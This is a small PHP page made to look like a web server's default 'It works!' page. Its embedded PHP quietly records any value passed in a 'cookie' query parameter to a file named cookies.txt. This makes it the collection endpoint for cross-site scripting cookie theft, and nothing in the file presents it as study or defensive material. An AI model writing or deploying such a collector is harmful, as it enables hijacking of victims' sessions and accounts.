<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
	"http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<title></title>
	</head>
	<body>
		<h1>It works!</h1>
		<?php			
			if(isset($_GET['cookie'])) {
				$mycookies = fopen("cookies.txt", "w");
				$cookie = $_GET["cookie"];				
				fwrite($mycookies, $cookie);
				fclose($mycookies);
			}           
        ?>

	</body>
</html>
